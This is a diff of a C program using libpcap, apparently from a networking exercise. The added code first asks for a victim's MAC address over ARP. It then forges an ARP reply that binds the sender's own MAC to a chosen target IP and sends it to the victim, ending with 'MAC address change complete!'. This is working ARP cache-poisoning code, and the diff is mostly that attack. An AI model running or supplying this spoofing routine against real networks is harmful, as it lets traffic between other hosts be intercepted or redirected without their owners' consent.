@@ -24,7 +24,7 @@ void print_mac(u_char *mac_addr) {
 	}
 }
 
-void print_packet(u_char *packet,int size) {
+void print_packet(const u_char *packet,int size) {
 	int i;
 	for(i=0;i<size;i++) {
 		printf("%02x%s",packet[i],i%16==15?"\n":i%8==7?"  ":" ");
@@ -101,21 +101,33 @@ int makeARPpacket(u_char *packet, u_char *dest_mac,u_char *src_mac, u_char *dest
 	input_arp(packet,dest_ip,4,&st);
 	return st;
 }
-
-int arp_send(u_char *dest_mac, u_char *s_packet, int s_packet_size, char *dev, u_char *my_mac, u_char *my_ip) {
+int arp_send(u_char *packet, int packet_size, char *dev) {
 	char errbuf[PCAP_ERRBUF_SIZE];
 	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
 	if(handle == NULL) {
 		printf("device %s open error\n",dev);
 		return -1;
 	}
-	
-	if(pcap_sendpacket(handle,s_packet,s_packet_size) == -1) {
+	if(pcap_sendpacket(handle,packet,packet_size) == -1) {
 		printf("send packet error\n");
 		pcap_close(handle);
 		return -1;
 	}
+	pcap_close(handle);
+	return 0;
+}
+
+int arp_send_recv(u_char *dest_mac, u_char *s_packet, int s_packet_size, char *dev, u_char *my_mac, u_char *my_ip) {
+	char errbuf[PCAP_ERRBUF_SIZE];
+	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+	if(arp_send(s_packet,s_packet_size,dev)) {
+		printf("send packet error\n");
+		return -1;
+	}
+	
 	while(true) {
+		printf("start capturing packet\n");
+
 		struct pcap_pkthdr* header;
 		const u_char* r_packet;
 		int r_size;
@@ -123,13 +135,21 @@ int arp_send(u_char *dest_mac, u_char *s_packet, int s_packet_size, char *dev, u
 		if (res == 0) continue;
 		if (res == -1 || res == -2) break;
 		r_size = header->caplen;
-		uint16_t eth_type = r_packet[E_T]<<8+r_packet[E_T+1];
+		print_packet(r_packet,r_size<0x4f?r_size:0x4f);
+		uint16_t eth_type = (r_packet[E_T]<<8)+r_packet[E_T+1];
+		printf("eth_type : %04x\n",eth_type);
+		print_mac(my_mac);
+		print_ip(my_ip);
 		if(eth_type != 0x0806) continue;
 		
-		if(memcmp(r_packet+TARG_MAC,my_mac,6) != 0 || memcmp(r_packet+TARG_IP,my_ip,4)!=0) continue;
+		if(memcmp(r_packet+TARG_MAC,my_mac,6) != 0 || memcmp(r_packet+TARG_IP,my_ip,4)!=0) {
+			printf("wrong packet received\n");
+			continue;
+		}
 		printf("target MAC received\n");
 		memcpy(dest_mac,r_packet+SEND_MAC,6);
 		print_mac(dest_mac);
+		pcap_close(handle);
 		return 0;
 	}
 
@@ -144,11 +164,15 @@ int main(int argc, char* argv[]) {
 	char* dev = argv[1];
 	u_char srcIP[4], srcMAC[6];
 	u_char sendIP[4], sendMAC[6];
+	u_char targetIP[4];
 	struct in_addr temp;
 	
 	inet_aton(argv[2],&temp);
 	getIPnMACaddr(dev,srcIP,srcMAC);
 	memcpy(sendIP,&temp,4);
+	inet_aton(argv[3],&temp);
+	memcpy(targetIP,&temp,4);
+	
 	print_ip(sendIP);
 	print_ip(srcIP);
 	memcpy(sendMAC,"\xff\xff\xff\xff\xff\xff",6);
@@ -157,40 +181,16 @@ int main(int argc, char* argv[]) {
 	int packet_size = makeARPpacket(packet,sendMAC,srcMAC,sendIP,srcIP,1);
 	printf("%d\n",packet_size);
 	print_packet(packet,packet_size);	
-	if(arp_send(sendMAC,packet,packet_size,dev,srcMAC,srcIP)) {
+	if(arp_send_recv(sendMAC,packet,packet_size,dev,srcMAC,srcIP)) {
 		printf("receive packet error\n");
 		return 0;
 	}
-	
+	packet_size = makeARPpacket(packet,sendMAC,srcMAC,sendIP,targetIP,2);
+	print_packet(packet,packet_size);
+	if(arp_send(packet,packet_size,dev) ) {
+		printf("packet spoofing error\n");
+		return 0;
+	}
+	printf("MAC address change complete!\n");
 	return 0;
-
-  char errbuf[PCAP_ERRBUF_SIZE];
-  pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
-  if (handle == NULL) {
-    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
-    return -1;
-  }
-
-  while (true) {
-    struct pcap_pkthdr* header;
-    const u_char* packet;
-    int res = pcap_next_ex(handle, &header, &packet);
-    if (res == 0) continue;
-    if (res == -1 || res == -2) break;
-    printf("%u bytes captured\n", header->caplen);
-    printf("src MAC : ");
-    for(int i=6;i<12;i++) { printf("%02x ",packet[i]);}
-    printf("\n");
-    printf("dest MAC : ");
-    for(int i=0;i<6;i++) { printf("%02x ",packet[i]);}
-    printf("\n");
-    uint16_t eth_type = (packet[12]<<8) + packet[13];
-    printf("type : %04x\n",eth_type);
-
-  }
-
-
-
-  pcap_close(handle);
-  return 0;
 }
